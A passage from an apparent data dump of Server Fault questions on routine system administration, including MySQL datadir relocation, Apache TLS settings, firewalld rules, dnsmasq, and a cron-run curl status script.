","<linux><virtualization><docker>","2016-08-19 02:02:48"
"1006536","Can't change the datadir for MariaDB mysql files","<p>This is CentOS 8.1 and MariaDB 10.3 database server.</p>

<p>I have followed the directions I've seen in several places to relocate the datadir from the default of /var/lib/mysql to /home/mysql. /home is the RAID.</p>

<p>I've made the change in /etc/my.cnf putting this before the !include stuff, but it appears to be still pointing to /var/lib/mysql.</p>

<p>When I have done this, mysql complains and it won't bring let my run the mysql command.</p>

<p>I have looked in /etc/my.cnf.d and see the default is still there in mariadb-server.cnf.</p>

<p>I see this message in the log and wasn't sure if this was related or not?</p>

<pre><code>Mar 11 11:58:44 myserver systemd[1]: Starting MariaDB 10.3 database server...

Mar 11 11:58:44 myserver mysql-prepare-db-dir[6349]: **Database MariaDB is probably initialized in /var/lib/mysql already, nothing is done.**

Mar 11 11:58:44 myserver mysql-prepare-db-dir[6349]: **If this is not the case, make sure the /var/lib/mysql is empty before running mysql-prepare-db-dir.**
</code></pre>

<p>I have tried running mysql-prepare-db-dir, but the same messages appear in the logs.</p>
","<centos><mariadb>","2020-03-11 16:14:49"
"1006650","Is it actually possible to send some data to remote destination over tcp/ip without any socket?","<p>I am studying socket concept. As far as I learned socket is like electrical socket that is created in both end of communicating devices (or processes). Socket can keep itself alive forever to listen some request (this is may be the key concept to make any server program).</p>

<p>However, my curious mind wants to know that is it possible to communicate between two computers without creating any socket (file descriptor) ?</p>

<p><strong>Please help with detail description, I am new in this area.</strong></p>

<p>Thank you in advance!</p>
","<linux><linux-networking><socket><tcpip><file-descriptors>","2020-03-12 12:00:45"
"797940","Linux Mint: Python process gets ""MemoryError"" before swap is even close to fully used","<p>I'm attempting to run a Python script that requires a lot of Virtual Memory.  I'm on Linux Mint 17.3 64 bit and Python 2.7.</p>

<p>As the Python process grows, I can see (using free -m) the amount of RAM use increase, but the amount of swap space used actually appears to be <em>decreasing</em>.</p>

<p>I tried changing vm.swappiness from 60 to 90, but that doesn't appear to have helped.</p>

<p>It's not a matter of the swap space being totally unused - some of it is in use.  But it's not being used as much as it probably should be.</p>

<p>BTW, I'm in a VMWare instance.</p>

<p>How can I run this large process without a MemoryError, and without changing the code?</p>

<p>Thanks!</p>

<p>PS: Here's some free -m output:</p>

<pre><code>$ while : ; do free -m; date; echo; sleep 10; done
cmd output started 2016 Fri Aug 19 08:47:39 AM PDT
             total       used       free     shared    buffers     cached
Mem:          7968       4764       3203         31        215        335
-/+ buffers/cache:       4214       3754
Swap:         8189       3452       4737
Fri Aug 19 08:47:39 PDT 2016

             total       used       free     shared    buffers     cached
Mem:          7968       4880       3087         31        215        343
-/+ buffers/cache:       4321       3646
Swap:         8189       3451       4738
Fri Aug 19 08:47:49 PDT 2016

             total       used       free     shared    buffers     cached
Mem:          7968       4982       2985         31        215        343
-/+ buffers/cache:       4423       3544
Swap:         8189       3449       4740
Fri Aug 19 08:47:59 PDT 2016
</code></pre>
","<linux><swap><virtual-memory>","2016-08-19 15:55:13"
"797959","Delete network credentials","<p>I wanted to copy something to another computer using network share, and used the my credentials, now it's saved on the other computer and don't know how to remove that any idea?</p>
","<networking><credentials>","2016-08-19 17:28:14"
"1006679","disable tls1.0 1.1 apache","<p>On my server with ubuntu 18.04.4 and apache 2.4.41
Im trying to disable tls1.0 and 1.1 by editing:</p>

<pre><code>/etc/apache2/mods-available/ssl.conf
</code></pre>

<p>with:</p>

<pre><code>SSLProtocol +TLSv1.2 +TLSv1.3
</code></pre>

<p>And afterwards running </p>

<pre><code>sudo service apache2 restart
</code></pre>

<p>However when I check my domain at <a href=""https://www.ssllabs.com"" rel=""nofollow noreferrer"">https://www.ssllabs.com</a> it still says </p>

<blockquote>
  <p>This server supports TLS 1.0 and TLS 1.1. Grade capped to B.</p>
</blockquote>

<p>I was following this <a href=""https://gist.github.com/GAS85/42a5469b32659a0aecc60fa2d4990308"" rel=""nofollow noreferrer"">https://gist.github.com/GAS85/42a5469b32659a0aecc60fa2d4990308</a> manual.</p>

<p>Im trying to config my first https website by using certbot.</p>

<p>How can I disable tls1.0 and 1.1 on an ubuntu server running apache.</p>
","<ubuntu><ssl><apache-2.4>","2020-03-12 14:37:24"
"1006772","How can OpenVPN say ""wrong credentials"" and then work 15 seconds later when I reconnect?","<p>I nearly got a heart attack today. OpenVPN, upon connecting to my VPN on startup, suddenly says ""wrong credentials"" (not sure if that was the exact phrasing, but it definitely was about the credentials, AKA username/password, being wrong)... after working every day, all day for a long time. And no, my account had not expired.</p>

<p>Less than half a minute later, I was able to connect. With no changes other than the time passing.</p>

<p>How can such things technically happen? If their server was down or something, wouldn't it give a different message, such as ""could not establish connection"" or something like that?</p>
","<openvpn>","2020-03-13 04:07:07"
"798051","FirewallD : Allow connections only from certain IP addresses","<p>I am trying to use FirewallD to restrict access to a CentOS server from other machines on the network. It has a single network interface and it is operating in the <strong>public</strong> zone. Lets say that the ip address of this server 10.10.1.20.</p>

<p>What I want to do is to allow only machines with IP addresses 10.10.1.125 and 10.10.1.126 to be able to connect (ssh and https) to this server. None of the other ip addresses should be able to connect to this server (or even know that it exists).</p>

<p>I tried using FirewallD's rich rules as follows (on 10.10.1.20)</p>

<pre><code>sudo firewall-cmd --add-rich-rule 'rule family=""ipv4"" source address=""10.10.1.0/24"" drop'

sudo firewall-cmd --add-rich-rule 'rule family=""ipv4"" source address=""10.10.1.125"" accept'

sudo firewall-cmd --add-rich-rule 'rule family=""ipv4"" source address=""10.10.1.126"" accept'
</code></pre>

<p>But it doesn't seem to work. I cannot make ssh connections to 10.10.1.20 from 10.10.1.125 or 10.10.1.126.</p>

<p>I tried entering the rules in the reverse order, but it still does not work.</p>

<p>Can someone help me out here? Do I need to change the zone from public to a more restrictive one like drop before the rules I wrote above can be applied?</p>
","<centos7><firewalld><firewalld-zone>","2016-08-20 08:11:14"
"1006777","Changing linux file system","<p>I have a <strong>CentOS7</strong> installed in a virtual machine. By <strong>default</strong>, the <strong>file system of it was XFS</strong> both of the <strong>""/"" and ""/boot""</strong>. Now I want it to <strong>change the file system</strong> of the <strong>""/boot"" to ext3</strong>. The <strong>reason</strong> why I want to change it is I have here <strong>a backup server that requires an ext3 file system for it to be able to back up the Linux server</strong>. Can I change the XFS to ext3?</p>
","<centos7>","2020-03-13 05:36:16"
"798269","Different Product Key & License in Microsoft Volume License and What is MAK Activations Used/Available*?","<p>First, I dont familiar with windows volume license ...
My company give me an access to check how many windows os license left</p>

<p>In Microsoft Volume License, in menu License summary its show some thing like this :</p>

<p><a href=""https://i.sstatic.net/lP30d.png"" rel=""nofollow noreferrer"">first image</a></p>

<p>I have questions :</p>

<ol>
<li><p>It's show MAX Activations Used/Available with value = 1/50 is it means i have activated 1 time with the product key and i have 49 more ?</p></li>
<li><p>Whats is different between product keys and Licenses ? 
in Product Key tab its show me more than 1 OS but in licenses tab only show windows 8, like this :
<a href=""https://i.sstatic.net/jsFF6.png"" rel=""nofollow noreferrer"">second image</a></p></li>
</ol>

<p>*sorry for my bad english..</p>
","<windows><licensing>","2016-08-22 08:36:14"
"1007038","How to downgrade Ubuntu 18.10 to Ubuntu 14.04?","<p>My VPS host doesn't have any options for this and the script I'm trying to run absolutely only works on Ubuntu 14.04, any options? i prepaid for the VPS so i don't wanna have to switch hosts.</p>
","<ubuntu><vps><ubuntu-14.04>","2020-03-15 18:49:04"
"798361","Replaying HTTP requests from a log file, to load test a new server?","<p>I have a HTTP server that serves images generated from a database. It has some level of caching built in, etc. It generates map tile images for javascript based web maps (a la Google Maps etc.) We're thinking of switching to the underlying technology, but the same results will be coming out. However we'd like to load test it first, to ensure that the new tech is able to perform about as well as the old tech.</p>

<p>We have lots of apache access logs from our production servers, in standard/default apache log format. I'd like to use these URLs (&amp; timestamps) as a stress test for the new server, by replaying the same URLs, in order, with the same delay between requests. I want to make a request to the same URL, but I alway want them to be (as close as possible) to the same order, and with similar delay between requests, to simulate real world user behaviour, rather than just fire all URLs at the same time.</p>

<p>Is any open source software running on linux, which will take an apache log file, parse out the URLs (I can do that already with my <a href=""https://github.com/rory/apache-log-parser"" rel=""nofollow noreferrer"">apache-log-parser</a> python library), and then ""replay"" the HTTP requests against the server, with appropriate delay between requests.</p>

<p>The output I'd like to get is approximately average response rates from the server, to see if it can handle the real world load.</p>

<p>I have <a href=""http://munin-monitoring.org/"" rel=""nofollow noreferrer"">Munin</a> on the server so I can check for load.</p>
","<linux><apache-2.2><performance><log-files><load-testing>","2016-08-22 14:35:42"
"798419","How to conditionally redirect DNS queries by server with dnsmasq?","<p>I would like to know if it is possible to create a conditional redirect like:</p>

<pre><code># all domains *.lan
address=*.lan
server=192.168.1.254

# rest of all
address=
server 8.8.8.8
</code></pre>
","<dnsmasq>","2016-08-22 19:01:33"
"798431","Let's find a solution of how run a website with xampp on windows server 2008 / Share your experience","<p>Well, I searched for it so much! But I couldn't find anything useful about it.</p>

<p>I have a server with <strong>windows server 2008 r2</strong> running on it.</p>

<p>I configured DNS and domain name and they are working properly.</p>

<p>Now I want to run my website with <strong>xampp</strong> not with IIS. I've installed xampp.</p>

<p>The problem is, xampp is using <strong>port 80</strong> for http requests. Some other programs also use port 80 like svchost (That can not be terminated because system crashes.)</p>

<p>So we have to change the xampp port to 8080 or somrthing else. In this case yes xampp works. But just if we type </p>

<blockquote>
  <p>mydomain.com:8080</p>
</blockquote>

<p>in the browser.</p>

<p>I don't want this. I want </p>

<blockquote>
  <p>mydomain.com</p>
</blockquote>

<p>(Which is on port 80) directly point to xampp.</p>

<p>These are the solutions I've thought about for solving the problem:</p>

<p>1.Port forwarding: Like forward all incoming requests in port 80 to 8080(Xampp)</p>

<p>2.Changing default http listening port to 8080</p>

<p>I can't find a way to do one of the cases above. Maybe I'm wrong.</p>

<p>That was the main problem. Any idea?</p>
","<windows-server-2008><port><xampp>","2016-08-22 20:06:38"
"1007299","cannot ssh into Amazon EC2 Instance, first time setting it up","<p>Can't SSH into instance, security groups and everything else looks good. Is the not having a key pair the problem?</p>

<p><a href=""https://admiral-iad.ec2.amazon.com/instance/62622761750#linker_verify_account=786080552225"" rel=""nofollow noreferrer"">https://admiral-iad.ec2.amazon.com/instance/62622761750#linker_verify_account=786080552225</a></p>
","<ssh><ssh-keys>","2020-03-17 19:00:59"
"798549","Why does youtube uses http for video uploads?","<p>I researched a bit and found that YouTube uses http for file upload. I also found that they don't use ftp due to security issues, in that case why don't they use sftp?
Why do they use http specifically, why not any other protocol?</p>
","<ftp><http><sftp>","2016-08-23 10:31:17"
"1007363","How to get latest NVIDIA P100 GRID driver for GCE","<p>I own a Windows Server 2019 GUI virtual machine, with a P100 driver.</p>

<p>The problem is that some of my games requires the latest NVIDIA P100 driver, 442.29, but the latest driver released by GCE is 442.06 (there: <a href=""https://storage.googleapis.com/nvidia-drivers-eu-public/"" rel=""nofollow noreferrer"">https://storage.googleapis.com/nvidia-drivers-eu-public/</a>)</p>

<p>Do I have to wait for them to update it ? If yes, how much time ? Thanks !</p>
","<google-compute-engine>","2020-03-18 09:55:05"
"1007389","active/active load balancer in linux?","<p>we have 2 haproxy servers in an active passive (keepalived) setup forwarding to a couple apache backends. The load has increased and I'm searching for an active active load balancer solution. Is there anybody that has faced a similar issue? If possible I would prefer not to mess around with the DNS setup.
Thanks</p>
","<linux><load-balancing><haproxy><keepalived>","2020-03-18 13:01:02"
"1007488","Capturing Traffic on Local Machine With Multiple NICs On Linux","<p>So I have a virtual CentOS machine with multiple virtual NICs. I'm working on a project where we need to stand up an echo server on each of the NICs, listening on a particular port. Both the client, and the servers, and therefore the traffic, are local to the machine. I'm observing a strange behavior in the traffic flow when I start a client and connect to a local IP/port. Here's what I'm seeing: 
1. The client connects to the Server IP successfully, and sends data out successfully. 2. The server receives the data successfully.</p>

<p>So far, so good. The other part of the project is to collect the network stats from the system files, specifically, from /proc/net/dev.</p>

<p>I run a cat command in a loop on /proc/net/dev, and grep for the adapter that I'm targeting in my client application. I see no data in the ""received bytes"", and ""transmit bytes"" columns. However, I do see traffic on the loopback adapter (""lo"").</p>

<p>So the question is, why am I not seeing any traffic on the targeted adapter in the /proc/net/dev file while the server on the said adapter does receive packets from the client?</p>

<p>Secondly, is this a routing table issue, and if so, can we do something about it so we can collect the metrics from the /proc/net/dev file for that particular adapter?</p>

<p>Thanks in advance for your help!</p>
","<routing>","2020-03-18 23:25:04"
"1007512","What's the direction of speedtest download/upload?","<p>What's the direction of <code>download</code> and <code>upload</code> in speedtest?</p>

<p><a href=""https://i.sstatic.net/1L146.png"" rel=""nofollow noreferrer""><img src=""https://i.sstatic.net/1L146.png"" alt=""enter image description here""></a></p>

<p>The Server is Hong Kong STC, my local is: <code>12.34.156.228</code>.</p>

<p>When I test the speed, you can see the <code>DOWNLOAD</code> 28.38Mbps and <code>UPLOAD</code> 22.77Mbps. </p>

<p>I want to know the direction, is the <code>DOWNLOAD</code> means <code>STC</code> -> <code>local</code>? or on the contrary?</p>
","<networking><network-speed>","2020-03-19 05:44:55"
"1007689","MySQL , sysadmin, root access","<p>When enter to terminal: MySQL -u root -p
I get answer:  ERROR 1045 (28000): Access denied for user 'root'@'localhost' (using password: YES)bash: Cd: /path/to/directory  : No such file or directory</p>

<p>When i enter to terminal ""superuser do -s""  I get this answer:No such file or directory.
All answer I see here need use MySQL to get permissions, so there it was not possible for me.
I do have root access to my server so it should be possible to fix this.  And I had this before.
Happy to get help with this.</p>
","<mysql><phpmyadmin>","2020-03-20 12:37:22"
"1007696","Why connecting to a high SSH port number takes longer than a lower port number?","<p>I have a Linux server to SSH, and the old port number was 1818. Recently there's been a network issue in my country that I had issue reaching my server port 1818. So I decided to change it to another port, like 46000. I then changed it to lower port number like 1994, and it worked well too.</p>

<p>But the issue is time I wait to get the first response when trying to do SSH port number 46000 is much longer than time spending on 1994.</p>

<p>Let me first explain my assumption: when I use ssh root@ip -p1994, my network checks the ports from 1 to 65535, and because 1994 is lower than 46000, so it takes less time to connect than 46000. My assumption is something like this:</p>

<blockquote>
  <p>check if port is correct:</p>
  
  <p>is 1 SSH port? if no, ignore; else connect.</p>
  
  <p>is 2 SSH port? if no, ignore; else connect.</p>
  
  <p>...</p>
  
  <p>is 1994 SSH port? so I (my network) and the server connect to each other.</p>
</blockquote>

<p>While 46000 is much more down in my assumption, then it takes much longer to connect.</p>

<p>Is my assumption for this issue correct? If no, then what is the logic of this delay in connecting?</p>

<p>Thanks in advance</p>
","<ssh><port>","2020-03-20 13:50:18"
"798897","MySQL Wont Start with Datadir Change","<p>I'm trying to change the <code>datadir</code> for mysql. When I try to restart the service it hangs for 10 minutes, then fails to restart. Here are the steps I took to change the dir:</p>

<ol>
<li>sudo service mysqld stop</li>
<li>sudo cp -R -p /var/lib/mysql /srv/msqyl2</li>
<li>ls -lha /srv/mysql2

<blockquote>
  <p>drwxr-xr-x.  4 mysql mysql 4.0K Aug 24 17:51 msqyl2</p>
</blockquote></li>
</ol>

<ol start=""4"">
<li>sudo vim /etc/my.cnf</li>
<li>Comment out default directory, `#datadir=/var/lib/mysql`</li>
<li>Add a new line with same directive but new location, `datadir=/srv/mysql2`</li>
<li>sudo service mysql start</li>
</ol>

<p>This gives me:</p>

<blockquote>
  <p>Job for mysqld.service failed because a timeout was exceeded. See ""systemctl status mysqld.service"" and ""journalctl -xe"" for details.</p>
</blockquote>

<p>after about 10 minutes of it processing the <code>start</code>. If I reverse the commenting so the directory is the default directory, then the restart works in &lt; 5 seconds.</p>

<p>The <code>journalctl -xe</code> brings back:</p>

<pre><code>Aug 24 18:35:17 uroot-ARTMO-myserver-1 systemd[1]: mysqld.service start-post operation timed out. Stopping.
Aug 24 18:35:17 uroot-ARTMO-myserver-1 systemd[1]: Failed to start MySQL Community Server.
-- Subject: Unit mysqld.service has failed
-- Defined-By: systemd
-- Support: http://lists.freedesktop.org/mailman/listinfo/systemd-devel
-- 
-- Unit mysqld.service has failed.
-- 
-- The result is failed.
Aug 24 18:35:17 uroot-ARTMO-myserver-1 systemd[1]: Unit mysqld.service entered failed state.
Aug 24 18:35:18 uroot-ARTMO-myserver-1 systemd[1]: mysqld.service failed.
Aug 24 18:35:18 uroot-ARTMO-myserver-1 polkitd[1309]: Unregistered Authentication Agent for unix-process:22433:121785532 (system bus name :1.833, object path /org/freedesktop/PolicyKi
Aug 24 18:35:18 uroot-ARTMO-myserver-1 systemd[1]: mysqld.service holdoff time over, scheduling restart.
Aug 24 18:35:18 uroot-ARTMO-myserver-1 systemd[1]: Starting MySQL Community Server...
-- Subject: Unit mysqld.service has begun start-up
-- Defined-By: systemd
-- Support: http://lists.freedesktop.org/mailman/listinfo/systemd-devel
-- 
-- Unit mysqld.service has begun starting up.
Aug 24 18:35:18 uroot-ARTMO-myserver-1 mysqld_safe[24090]: 160824 18:35:18 mysqld_safe Logging to '/var/log/mysqld.log'.
Aug 24 18:35:18 uroot-ARTMO-myserver-1 mysqld_safe[24090]: 160824 18:35:18 mysqld_safe Starting mysqld daemon with databases from /srv/mysql2
Aug 24 18:35:18 uroot-ARTMO-myserver-1 mysqld_safe[24090]: 160824 18:35:18 mysqld_safe mysqld from pid file /var/run/mysqld/mysqld.pid ended
</code></pre>

<p>The <code>systemctl status mysqld.service</code> brings back:</p>

<pre><code>● mysqld.service - MySQL Community Server
   Loaded: loaded (/usr/lib/systemd/system/mysqld.service; enabled; vendor preset: disabled)
   Active: activating (start-post) since Wed 2016-08-24 18:45:18 CEST; 8min ago
  Process: 26133 ExecStart=/usr/bin/mysqld_safe (code=exited, status=0/SUCCESS)
  Process: 26120 ExecStartPre=/usr/bin/mysql-systemd-start pre (code=exited, status=0/SUCCESS)
 Main PID: 26133 (code=exited, status=0/SUCCESS);         : 26134 (mysql-systemd-s)
   CGroup: /system.slice/mysqld.service
           └─control
             ├─26134 /bin/bash /usr/bin/mysql-systemd-start post
             └─27942 sleep 1

Aug 24 18:45:18 uroot-ARTMO-myserver-1 systemd[1]: Starting MySQL Community Server...
Aug 24 18:45:18 uroot-ARTMO-myserver-1 mysqld_safe[26133]: 160824 18:45:18 mysqld_safe Logging to '/var/log/mysqld.log'.
Aug 24 18:45:18 uroot-ARTMO-myserver-1 mysqld_safe[26133]: 160824 18:45:18 mysqld_safe Starting mysqld daemon with databases from /srv/mysql2
</code></pre>

<p>The permissions for the default dir <code>/var/lib/mysql</code> is:</p>

<blockquote>
  <p>drwx------.  2 mysql mysql 4.0K Aug 18 21:32 mysql</p>
</blockquote>

<p>The <code>mysqld.log</code> has:</p>

<pre><code>160824 18:35:18 mysqld_safe Starting mysqld daemon with databases from /srv/mysql2
2016-08-24 18:35:18 0 [Warning] TIMESTAMP with implicit DEFAULT value is deprecated. Please use --explicit_defaults_for_timestamp server option (see documentation for more details).
2016-08-24 18:35:18 0 [Note] /usr/sbin/mysqld (mysqld 5.6.32) starting as process 24253 ...
2016-08-24 18:35:18 24253 [Warning] Can't create test file /srv/mysql2/uroot-ARTMO-myserver-1.lower-test
2016-08-24 18:35:18 24253 [Warning] Can't create test file /srv/mysql2/uroot-ARTMO-myserver-1.lower-test
2016-08-24 18:35:18 24253 [Warning] Buffered warning: Changed limits: max_open_files: 1024 (requested 5000)

2016-08-24 18:35:18 24253 [Warning] Buffered warning: Changed limits: table_open_cache: 431 (requested 2000)

2016-08-24 18:35:18 24253 [Note] Plugin 'FEDERATED' is disabled.
/usr/sbin/mysqld: Can't find file: './mysql/plugin.frm' (errno: 13 - Permission denied)
2016-08-24 18:35:18 24253 [ERROR] Can't open the mysql.plugin table. Please run mysql_upgrade to create it.
2016-08-24 18:35:18 24253 [Note] InnoDB: Using atomics to ref count buffer pool pages
2016-08-24 18:35:18 24253 [Note] InnoDB: The InnoDB memory heap is disabled
2016-08-24 18:35:18 24253 [Note] InnoDB: Mutexes and rw_locks use GCC atomic builtins
2016-08-24 18:35:18 24253 [Note] InnoDB: Memory barrier is not used
2016-08-24 18:35:18 24253 [Note] InnoDB: Compressed tables use zlib 1.2.3
2016-08-24 18:35:18 24253 [Note] InnoDB: Using Linux native AIO
2016-08-24 18:35:18 24253 [Note] InnoDB: Using CPU crc32 instructions
2016-08-24 18:35:18 24253 [Note] InnoDB: Initializing buffer pool, size = 128.0M
2016-08-24 18:35:18 24253 [Note] InnoDB: Completed initialization of buffer pool
2016-08-24 18:35:18 7f32872e8740  InnoDB: Operating system error number 13 in a file operation.
InnoDB: The error means mysqld does not have the access rights to
InnoDB: the directory.
2016-08-24 18:35:18 24253 [ERROR] InnoDB: os_file_get_status() failed on './ibdata1'. Can't determine file permissions
2016-08-24 18:35:18 24253 [ERROR] InnoDB: The system tablespace must be writable!
2016-08-24 18:35:18 24253 [ERROR] Plugin 'InnoDB' init function returned error.
2016-08-24 18:35:18 24253 [ERROR] Plugin 'InnoDB' registration as a STORAGE ENGINE failed.
2016-08-24 18:35:18 24253 [ERROR] Unknown/unsupported storage engine: InnoDB
2016-08-24 18:35:18 24253 [ERROR] Aborting

2016-08-24 18:35:18 24253 [Note] Binlog end
2016-08-24 18:35:18 24253 [Note] Shutting down plugin 'partition'
2016-08-24 18:35:18 24253 [Note] Shutting down plugin 'PERFORMANCE_SCHEMA'
2016-08-24 18:35:18 24253 [Note] Shutting down plugin 'INNODB_SYS_DATAFILES'
2016-08-24 18:35:18 24253 [Note] Shutting down plugin 'INNODB_SYS_TABLESPACES'
2016-08-24 18:35:18 24253 [Note] Shutting down plugin 'INNODB_SYS_FOREIGN_COLS'
2016-08-24 18:35:18 24253 [Note] Shutting down plugin 'INNODB_SYS_FOREIGN'
2016-08-24 18:35:18 24253 [Note] Shutting down plugin 'INNODB_SYS_FIELDS'
2016-08-24 18:35:18 24253 [Note] Shutting down plugin 'INNODB_SYS_COLUMNS'
2016-08-24 18:35:18 24253 [Note] Shutting down plugin 'INNODB_SYS_INDEXES'
2016-08-24 18:35:18 24253 [Note] Shutting down plugin 'INNODB_SYS_TABLESTATS'
2016-08-24 18:35:18 24253 [Note] Shutting down plugin 'INNODB_SYS_TABLES'
2016-08-24 18:35:18 24253 [Note] Shutting down plugin 'INNODB_FT_INDEX_TABLE'
2016-08-24 18:35:18 24253 [Note] Shutting down plugin 'INNODB_FT_INDEX_CACHE'
2016-08-24 18:35:18 24253 [Note] Shutting down plugin 'INNODB_FT_CONFIG'
2016-08-24 18:35:18 24253 [Note] Shutting down plugin 'INNODB_FT_BEING_DELETED'
2016-08-24 18:35:18 24253 [Note] Shutting down plugin 'INNODB_FT_DELETED'
2016-08-24 18:35:18 24253 [Note] Shutting down plugin 'INNODB_FT_DEFAULT_STOPWORD'
2016-08-24 18:35:18 24253 [Note] Shutting down plugin 'INNODB_METRICS'
2016-08-24 18:35:18 24253 [Note] Shutting down plugin 'INNODB_BUFFER_POOL_STATS'
2016-08-24 18:35:18 24253 [Note] Shutting down plugin 'INNODB_BUFFER_PAGE_LRU'
2016-08-24 18:35:18 24253 [Note] Shutting down plugin 'INNODB_BUFFER_PAGE'
2016-08-24 18:35:18 24253 [Note] Shutting down plugin 'INNODB_CMP_PER_INDEX_RESET'
2016-08-24 18:35:18 24253 [Note] Shutting down plugin 'INNODB_CMP_PER_INDEX'
2016-08-24 18:35:18 24253 [Note] Shutting down plugin 'INNODB_CMPMEM_RESET'
2016-08-24 18:35:18 24253 [Note] Shutting down plugin 'INNODB_CMPMEM'
2016-08-24 18:35:18 24253 [Note] Shutting down plugin 'INNODB_CMP_RESET'
2016-08-24 18:35:18 24253 [Note] Shutting down plugin 'INNODB_CMP'
2016-08-24 18:35:18 24253 [Note] Shutting down plugin 'INNODB_LOCK_WAITS'
2016-08-24 18:35:18 24253 [Note] Shutting down plugin 'INNODB_LOCKS'
2016-08-24 18:35:18 24253 [Note] Shutting down plugin 'INNODB_TRX'
2016-08-24 18:35:18 24253 [Note] Shutting down plugin 'BLACKHOLE'
2016-08-24 18:35:18 24253 [Note] Shutting down plugin 'ARCHIVE'
2016-08-24 18:35:18 24253 [Note] Shutting down plugin 'MRG_MYISAM'
2016-08-24 18:35:18 24253 [Note] Shutting down plugin 'MyISAM'
2016-08-24 18:35:18 24253 [Note] Shutting down plugin 'MEMORY'
2016-08-24 18:35:18 24253 [Note] Shutting down plugin 'CSV'
2016-08-24 18:35:18 24253 [Note] Shutting down plugin 'sha256_password'
2016-08-24 18:35:18 24253 [Note] Shutting down plugin 'mysql_old_password'
2016-08-24 18:35:18 24253 [Note] Shutting down plugin 'mysql_native_password'
2016-08-24 18:35:18 24253 [Note] Shutting down plugin 'binlog'
2016-08-24 18:35:18 24253 [Note] /usr/sbin/mysqld: Shutdown complete

160824 18:35:18 mysqld_safe mysqld from pid file /var/run/mysqld/mysqld.pid ended
</code></pre>
","<mysql><permissions><centos7><mysql5.6>","2016-08-24 18:07:47"
"1007731","Curl doesn't work when run with crontab","<p>This is my curl script</p>

<pre class=""lang-sh prettyprint-override""><code>#!/bin/bash

PING_STATUS=""$(netcat -vz mc.bella.wtf 25565 2&gt;&amp;1)""
curl -H ""Content-Type: application/json"" -X POST -d '{""embeds"": [{""title"": ""Server Status:"",""color"": 16027903,""description"": ""'""$PING_STATUS""'""}]}' ""$WEBHOOK""
</code></pre>

<p>This is what I get when I run my crontab:</p>

<pre><code>mc@ubuntu:~$ crontab -l
* * * * * /home/mc/server/ping &gt;/tmp/mycommand.log 2&gt;&amp;1
mc@ubuntu:~$ cat /tmp/mycommand.log 
curl: (3) &lt;url&gt; malformed
</code></pre>

<p>Why is my url malformed when it works fine when running the script by itself?</p>
","<bash><cron><curl>","2020-03-20 18:16:22"
"1007743","What was happening in this Let's Encrypt CAA bug?","<p>Recently, Let's Encrypt shared this bug that occured in their systems leading to certificate issues to their clients. They describe the bug this way:</p>

<blockquote>
  <p>The bug: when a certificate request contained N domain names that needed CAA rechecking, Boulder would pick one domain name and check it N times. What this means in practice is that if a subscriber validated a domain name at time X, and the CAA records for that domain at time X allowed Let’s Encrypt issuance, that subscriber would be able to issue a certificate containing that domain name until X+30 days, even if someone later installed CAA records on that domain name that prohibit issuance by Let’s Encrypt.</p>
</blockquote>

<p>Does this mean that when a user had more than one domain name that needed CA rechecking, Let's Encrypt would only check the first domain? Was the issue that certificates were issued on domains that were not owned by the user getting the certificate? </p>
","<bug><caa-record>","2020-03-20 19:49:27"
"1007834","uptime | awk -F: '{print $NF}' - What happens here?","<p>Can someone explain me what happens here?</p>

<pre><code>uptime | awk -F: '{print $NF}'
</code></pre>

<ul>
<li>-F: field separator</li>
<li>$NF: number of fields in the current line</li>
</ul>

<p>I don't understand why this command result in the same result as</p>

<pre><code>uptime | awk -F: '{print $5}'
</code></pre>
","<linux><ubuntu><shell><awk>","2020-03-21 22:03:40"
"1007902","Azure Free Trial account VM size is greyed","<p>I have a free trial for azure . I am trying to create an initial windows machine with B1S size ( Free service ) . All the sizes are greyed out . I am in region US ( EAST ) . What can be the problem . I signed out and signed back in, still see the issue. I am going through the following option Home>Free Services > Create a Virtual machine . So what can be the problem</p>
","<azure><virtual-machines>","2020-03-22 17:56:44"
"799152","SCCM licensing on a Hyper-V cluster","<p>We have two Microsoft Private Clouds: one consists of 8 nodes (each with two processors) and the other consists of 4 nodes (each with two processors). Call them Private Cloud A and Private Cloud B. Each node is currently licensed on our EA with a Windows Server 2012 R2 Datacentre license.</p>

<p>Some production services are hosted on A, with DR instances for those services existing on B (i.e. SQL availability group with primary on A, one secondary on A (for HA) and one secondary on B (for DR), Exchange cross-site DAG). We also have some production services running on B, with DR instances running on A.</p>

<p>Private Cloud A hosts about 70 VM's (95% Windows Server 2012, rest are Linux based) and Private Cloud B hosts about 30 VM's.</p>

<p>We'd like to implement SCCM (more specifically, SCVMM) to help us manage the virtual environment (which is currently done mostly through Powershell scripts and manual intervention on Failover Cluster Manager and Hyper-V console).</p>

<p>How should we license SCCM 2012 R2 in this environment? Would I need to purchase a Datacentre License for each of the 12 hosts (which would be an exorbitant amount)? Or, do I only license one host with a Standard license, and host all my VM's that run SCCM components on that one host? Or should I rather put down a physical machine to host these components, and license with a Standard license?</p>
","<hyper-v><licensing><sccm-2012-r2>","2016-08-25 19:29:57"
"799220","Can I host the same domain I've used as a nameserver?","<p>I've setup a domain I have as NS1.DOMAIN.COM for my other sites. But there seems to be an issue with actually getting it to be viewed as a website. I'm currently using VESTA and my registrar is GoDaddy. Any suggestions about things I should check into would be much appreciated.</p>
","<domain><vps><nameserver><godaddy>","2016-08-26 02:52:19"
"799268","Django - How many simultaneous requests are possible","<p>I have a Django app running on Heroku. At the moment I only have 1 dyno. One of the urls generates a pdf from database values and this takes about 4 seconds. Since I only have 1 dyno, does it mean that while the pdf is busy generating, my dyno can't respond to any other requests from any other users?</p>

<p>In other words, how many open requests can Django/Heroku handle at a given time?</p>
","<django>","2016-08-26 09:20:43"
"799289","Can Python's psycopg2 use a password protected client certificate and key?","<p>When using psycopg2 library to connect to a Postgres server with client auth required, I have seen connection strings that look like,</p>

<pre><code>import psycopg2
c = psycopg2.connect(""host=myhost dbname=mydb sslmode=verify-full sslcert=/root/.postgresql/aa/postgresql.crt sslkey=/root/.postgresql/aa/postgresql.key"")
</code></pre>

<p>Can psycopg2 handle password encrypted key files? What happens if postgresql.key is password protected? Does connect() prompt for a password to unwrap the key? Can a password to the key file be provided in the connection string?</p>

<p>Thanks</p>
","<ssl><postgresql><python>","2016-08-26 11:00:15"
"1008191","Can separate network segments connected by a router be considered on the same segment?","<p>Say you have two or more network segments that are connected by a router, or perhaps multiple segments connected by multiple routers connected together by a router. Would the devices on the aforementioned segments be considered on the same network segment?</p>
","<networking><router>","2020-03-24 16:20:22"
"1008277","Unknown PTR record in DNS; it’s not there in Cloudflare DNS Settings","<p>(1.) There is an extra, unwanted, unexpected, unadded PTR record in my DNS settings, with value set to the Domain Name ""mediati.net"". You can see it here in MxToolbox Reverse Lookup:
